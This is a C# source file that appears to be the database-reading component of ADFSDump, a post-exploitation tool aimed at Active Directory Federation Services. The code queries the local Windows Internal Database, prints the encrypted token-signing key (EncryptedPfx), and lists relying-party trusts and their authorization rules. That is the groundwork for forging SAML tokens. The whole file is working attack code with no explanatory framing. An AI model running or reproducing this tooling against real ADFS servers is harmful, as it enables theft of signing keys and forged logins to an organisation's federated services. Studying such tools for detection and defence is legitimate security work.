using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Xml;
using ADFSDump.RelyingPartyTrust;

namespace ADFSDump.ReadDB
{
    public class DatabaseReader
    {
        private const string _WIDConnectionString = "Data Source=np:\\\\.\\pipe\\microsoft##wid\\tsql\\query;Initial Catalog=AdfsConfigurationV3;Integrated Security=True";
        private const string _ReadEncryptedPfxQuery = "SELECT ServiceSettingsData from ADFSConfigurationV3.IdentityServerPolicy.ServiceSettings";
        private readonly string[] _BuiltInScopes = { "SelfScope", "ProxyTrustProvisionRelyingParty", "Device Registration Service", "UserInfo", "PRTUpdateRp", "Windows Hello - Certificate Provisioning Service", "urn:AppProxy:com" };
        private const string _ReadScopePolicies = "SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId, SAML.Binding, SAML.Location,POLICYTEMPLATE.name, POLICYTEMPLATE.PolicyMetadata, SCOPEIDS.IdentityData FROM AdfsConfigurationV3.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN AdfsConfigurationV3.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN AdfsConfigurationV3.IdentityServerPolicy.PolicyTemplates POLICYTEMPLATE ON SCOPES.PolicyTemplateId = POLICYTEMPLATE.PolicyTemplateId LEFT OUTER JOIN AdfsConfigurationV3.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId";
        private const string _ReadRules = "Select SCOPE.ScopeId, SCOPE.name, POLICIES.PolicyData,POLICIES.PolicyType, POLICIES.PolicyUsage FROM AdfsConfigurationV3.IdentityServerPolicy.Scopes SCOPE INNER JOIN AdfsConfigurationV3.IdentityServerPolicy.ScopePolicies SCOPEPOLICIES ON SCOPE.ScopeId = SCOPEPOLICIES.ScopeId INNER JOIN AdfsConfigurationV3.IdentityServerPolicy.Policies POLICIES ON SCOPEPOLICIES.PolicyId = POLICIES.PolicyId";

        public Dictionary<string, RelyingParty>.ValueCollection readConfigurationDB()
        {
            return readWID();
        }

        public Dictionary<string, RelyingParty>.ValueCollection readWID()
        {
            Dictionary<string, RelyingParty> rps = new Dictionary<string, RelyingParty>();

            SqlConnection conn = null;
            SqlDataReader reader = null;
            try
            {
                conn = new SqlConnection(_WIDConnectionString);
                conn.Open();

                SqlCommand cmd = new SqlCommand(_ReadEncryptedPfxQuery, conn);
                reader = cmd.ExecuteReader();

            } catch (Exception e)
            {
                Console.WriteLine("!!! Exception: {0}", e);
            }

            while (reader.Read())
            {
                string xmlString = reader.GetString(0);

                XmlDocument xmlDocument = new XmlDocument();
                xmlDocument.LoadXml(xmlString);

                XmlElement root = xmlDocument.DocumentElement;

                XmlNode signingToken = root.GetElementsByTagName("SigningToken")[0];
                XmlNode encryptedPfx = root.GetElementsByTagName("EncryptedPfx")[0];
                Console.WriteLine("Encrypted Token Signing Key\r\n=============================\r\n{0}\r\n\r\n", encryptedPfx.InnerText);

            }
            reader.Close();

            // enumerate scopes and policies
            try
            {
                SqlCommand cmd = new SqlCommand(_ReadScopePolicies, conn);
                reader = cmd.ExecuteReader();
            }
            catch (Exception e)
            {
                Console.WriteLine("!!! Exception: {0}", e);
            }

            while (reader.Read())
            {
                string name = reader.GetString(1);
                if (!_BuiltInScopes.Any(name.Contains))
                {
                    string scopeId = reader.GetGuid(0).ToString();
                    RelyingParty rp = new RelyingParty { Name = name, Id = scopeId };
                    rp.IsEnabled = reader.GetBoolean(3);
                    rp.SignatureAlgorithm = reader.GetString(4);
                    rp.AccessPolicy = reader.GetString(11);
                    rp.Identity = reader.GetString(12);

                    if (!reader.IsDBNull(2))
                    {
                        rp.IsSaml = false;
                        rp.IsWsFed = true;
                        rp.FederationEndpoint = reader.GetString(2);
                    }
                    else
                    {
                        rp.IsSaml = true;
                        rp.IsWsFed = false;
                        rp.FederationEndpoint = reader.GetString(9);
                    }

                    if (!reader.IsDBNull(6))
                    {
                        rp.EncryptionCert = reader.GetString(6);
                    }

                    rps[scopeId] = rp;
                    
                }
            }
            reader.Close();

            try
            {
                SqlCommand cmd = new SqlCommand(_ReadRules, conn);
                reader = cmd.ExecuteReader();
            }
            catch( Exception e)
            {
                Console.WriteLine("!!! Exception: {0}", e);
            }

            while (reader.Read())
            {
                string scopeId = reader.GetGuid(0).ToString();
                string rule = reader.GetString(2);
                if (rps.Keys.Contains(scopeId) && !string.IsNullOrEmpty(rule))
                {

                    int ruleType = reader.GetInt32(4);
                    if (ruleType == 4) { rps[scopeId].StrongAuthRules = rule; }
                    else if (ruleType == 3) { rps[scopeId].OnBehalfAuthRules = rule; }
                    else if (ruleType == 2) { rps[scopeId].ActAsAuthRules = rule; }
                    else if (ruleType == 1) { rps[scopeId].AuthRules = rule; }
                    else { rps[scopeId].IssuanceRules = rule; }

                }


            }
            reader.Close();
            conn.Close();
            return rps.Values;
        }

    }
}
